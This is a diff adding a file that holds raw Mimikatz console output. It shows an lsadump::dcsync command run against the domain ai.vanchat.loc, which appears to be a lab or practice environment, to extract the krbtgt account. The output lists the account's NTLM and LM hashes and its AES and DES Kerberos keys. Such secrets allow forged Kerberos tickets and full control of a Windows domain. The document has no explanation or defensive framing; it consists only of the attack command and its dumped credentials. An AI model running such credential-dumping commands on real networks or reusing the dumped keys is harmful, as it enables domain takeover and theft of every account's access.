@@ -1,0 +1,40 @@
+mimikatz # lsadump::dcsync /domain:ai.vanchat.loc /user:ai\krbtgt
+[DC] 'ai.vanchat.loc' will be the domain
+[DC] 'DC1.ai.vanchat.loc' will be the DC server
+[DC] 'ai\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 10/29/2025 8:18:41 AM
+Object Security ID   : S-1-5-21-2486023134-1966250817-35160293-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: d816e3b716ded6bc8cfc1feb5d165887
+    ntlm- 0: d816e3b716ded6bc8cfc1feb5d165887
+    lm  - 0: 901986f0452879701c446c3f91cec032
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : dced536fda01f09b01b28ca2892b7571
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : AI.VANCHAT.LOCkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee
+      aes128_hmac       (4096) : 69bc40cf2de61d483d8620a122e096d6
+      des_cbc_md5       (4096) : 1c45190b45d07979
+
+* Primary:Kerberos *
+    Default Salt : AI.VANCHAT.LOCkrbtgt
+    Credentials
+      des_cbc_md5       : 1c45190b45d07979
